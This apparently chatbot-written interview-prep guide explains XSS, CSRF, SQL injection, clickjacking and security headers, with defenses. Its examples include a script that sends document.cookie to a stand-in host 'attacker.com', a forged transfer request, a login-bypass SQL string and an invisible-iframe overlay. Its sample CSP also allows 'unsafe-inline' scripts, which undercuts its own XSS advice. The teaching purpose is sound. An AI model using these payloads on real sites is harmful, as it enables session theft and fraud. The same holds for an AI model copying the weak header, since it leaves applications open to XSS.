# 🔐 Web Security Deep Dive  
**XSS, CSRF, SQL Injection, Clickjacking & Security Headers**

This document provides a **comprehensive, in-depth explanation** of essential **web security vulnerabilities** — critical for **secure coding**, **backend development**, and **senior engineering roles**.

Each section includes:
- ✅ Clear definition
- ✅ How the attack works
- ✅ Real-world examples
- ✅ Prevention strategies
- ✅ Interview-ready answers

---

## 1. What is XSS (Cross-Site Scripting)? How can you prevent it?

> **XSS (Cross-Site Scripting)** is a vulnerability where an attacker **injects malicious scripts** into a web page viewed by other users.

The script runs in the **victim’s browser** — stealing cookies, session tokens, or defacing sites.

---

### 🔹 1.1 Types of XSS

| Type | How It Works |
|------|-------------|
| **Stored XSS** | Malicious script saved in DB (e.g., comment) → served to all users |
| **Reflected XSS** | Script reflected in response (e.g., search query) → victim clicks link |
| **DOM-based XSS** | Client-side JS writes user input to DOM without sanitization |

---

### 🔹 1.2 Example: Stored XSS

```html
<!-- User submits this as a comment -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

✅ Stored in DB → every user who views the page runs it.

---

### 🔹 1.3 Prevention

| Strategy | How It Works |
|--------|-------------|
| ✅ **Input Sanitization** | Strip or escape `<`, `>`, `&`, `"`, `'` |
| ✅ **Output Encoding** | Encode data before rendering (HTML, JS, URL) |
| ✅ **Content Security Policy (CSP)** | Block inline scripts and external sources |
| ✅ **Use Safe Frameworks** | React, Angular auto-escape by default |
| ✅ **HTTP-only Cookies** | Prevent JS access to session cookies |

---

### 🔹 1.4 Example: Output Encoding

❌ Bad:
```java
out.println("<div>" + userInput + "</div>");
```

✅ Good:
```java
out.println("<div>" + escapeHtml(userInput) + "</div>");
```

Or use templating engines (Thymeleaf, Handlebars) that auto-escape.

---

### 📌 Interview Answer

> _"XSS allows attackers to inject scripts into web pages. Stored XSS is most dangerous — script is saved and served to all users. I prevent it by sanitizing input, encoding output, using CSP, and marking cookies as HttpOnly. In modern frameworks like React, XSS is less likely due to auto-escaping."_  

---

## 2. What is CSRF (Cross-Site Request Forgery)? How do you protect against it?

> **CSRF** tricks a user into **executing unwanted actions** on a site where they’re authenticated.

Example: You’re logged into your bank → visit a malicious site → it submits a transfer form without your knowledge.

---

### 🔹 2.1 Example Attack

```html
<!-- Malicious site -->
<img src="https://yourbank.com/transfer?to=attacker&amount=1000" width="0" height="0">
```

✅ If you’re logged in, the browser sends your session cookie → transfer happens.

---

### 🔹 2.2 Prevention

| Strategy | How It Works |
|--------|-------------|
| ✅ **CSRF Tokens** | Server generates random token → embed in forms → validate on submit |
| ✅ **SameSite Cookies** | Set `SameSite=Strict` or `Lax` → browser won’t send in cross-origin requests |
| ✅ **Check Origin/Referer Headers** | Reject requests from unexpected domains |
| ✅ **Use POST for state changes** | Never use GET for actions with side effects |

---

### 🔹 2.3 Example: CSRF Token

```html
<form action="/transfer" method="post">
  <input type="hidden" name="_csrf" value="a3f8e2d1c0b9">
  <input type="text" name="to" value="Alice">
  <input type="submit" value="Transfer">
</form>
```

✅ Server validates `_csrf` token before processing.

---

### 📌 Interview Answer

> _"CSRF forces a logged-in user to perform unwanted actions. I prevent it using CSRF tokens — unique per session — and SameSite cookie attributes. Modern frameworks like Spring Security auto-enable CSRF protection. I also avoid GET requests for state-changing operations. Together, these make CSRF attacks nearly impossible."_  

---

## 3. What is SQL Injection? How can it be prevented?

> **SQL Injection** occurs when user input is **concatenated into SQL queries**, allowing attackers to **alter or execute arbitrary SQL**.

---

### 🔹 3.1 Example Attack

```java
String query = "SELECT * FROM users WHERE username = '" + username + "'";
```

Attacker inputs:
```text
username: ' OR '1'='1
```

✅ Final query:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1'
```

❌ Returns **all users** — bypasses authentication.

---

### 🔹 3.2 Prevention

| Strategy | How It Works |
|--------|-------------|
| ✅ **Prepared Statements (Parameterized Queries)** | SQL structure is fixed — input is data, not code |
| ✅ **ORM (JPA, Hibernate)** | Never write raw SQL |
| ✅ **Input Validation** | Reject suspicious input (e.g., `'`, `--`, `;`) |
| ✅ **Least Privilege DB User** | App DB user shouldn’t have `DROP TABLE` rights |

---

### 🔹 3.3 Example: Prepared Statement

❌ Bad:
```java
stmt.executeQuery("SELECT * FROM users WHERE id = " + id);
```

✅ Good:
```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, id);
ResultSet rs = ps.executeQuery();
```

✅ Input is **never part of the SQL structure**.

---

### 📌 Interview Answer

> _"SQL Injection happens when user input is concatenated into SQL, allowing attackers to manipulate queries. I prevent it using prepared statements — they separate SQL logic from data. I never use string concatenation for queries. In Spring, I use JPA repositories — they’re immune to SQLi. I also validate input and use least-privilege database accounts."_  

---

## 4. What is Clickjacking? How can you defend against it?

> **Clickjacking** (UI Redress Attack) tricks users into **clicking something different** than they think — by **overlaying invisible elements**.

---

### 🔹 4.1 Example Attack

```html
<!-- Attacker's page -->
<style>
  iframe {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0;
    z-index: 2;
  }
  button { z-index: 1; }
</style>

<button>Click to Win $1000!</button>
<iframe src="https://yourbank.com/transfer"></iframe>
```

✅ User clicks "Win $1000" → actually clicks "Transfer" on the hidden iframe.

---

### 🔹 4.2 Prevention

| Strategy | How It Works |
|--------|-------------|
| ✅ **X-Frame-Options Header** | Prevents embedding in `<iframe>` |
| ✅ **Content-Security-Policy (frame-ancestors)** | Modern replacement for X-Frame-Options |
| ✅ **Frame-busting JavaScript** | `top.location = self.location` (can be bypassed) |

---

### 🔹 4.3 Example: Security Headers

```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';
```

✅ `DENY` → no embedding  
✅ `frame-ancestors 'none'` → CSP version

---

### 📌 Interview Answer

> _"Clickjacking hides a dangerous page under a fake button. The user thinks they’re clicking one thing but trigger another. I prevent it using `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'` to block iframe embedding. This stops attackers from overlaying malicious UIs over trusted sites."_  

---

## 5. What are security headers? Name some important ones.

> **Security headers** are HTTP response headers that **instruct the browser** to enable built-in security features.

They are **critical for defense-in-depth**.

---

### 🔹 5.1 Essential Security Headers

| Header | Purpose | Example |
|-------|--------|--------|
| **`Content-Security-Policy`** | Prevent XSS by controlling sources of scripts, styles, etc. | `default-src 'self'; script-src 'self'` |
| **`X-Frame-Options`** | Prevent clickjacking by blocking iframe embedding | `DENY`, `SAMEORIGIN` |
| **`X-Content-Type-Options`** | Prevent MIME sniffing (e.g., JS disguised as image) | `nosniff` |
| **`Strict-Transport-Security` (HSTS)** | Force HTTPS — prevent downgrade attacks | `max-age=31536000; includeSubDomains` |
| **`Referrer-Policy`** | Control how much referrer info is sent | `no-referrer-when-downgrade` |
| **`Permissions-Policy`** (formerly Feature-Policy) | Control browser features (camera, geolocation) | `geolocation=(), camera=()` |

---

### 🔹 5.2 Example: Full Security Headers

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: no-referrer-when-downgrade
Permissions-Policy: geolocation=(), camera=()
```

✅ These headers are **automatically added** by frameworks like Spring Security.

---

### 📌 Interview Answer

> _"Security headers are HTTP headers that enable browser security features. Key ones: CSP to prevent XSS, X-Frame-Options to stop clickjacking, X-Content-Type-Options to block MIME sniffing, and HSTS to enforce HTTPS. I configure them in Spring Security or reverse proxy (NGINX). They’re essential for a defense-in-depth strategy — even if other protections fail."_  

---

## ✅ Final Tip

> 🎯 In interviews, **combine defenses**:
> _"I prevent XSS with CSP and output encoding, CSRF with tokens, SQLi with prepared statements, and clickjacking with X-Frame-Options."_  

That shows **deep, layered security thinking** — exactly what senior roles want.

---


Just say: _"Let’s do [topic]"_

You're mastering **web security** like a pro. 💪
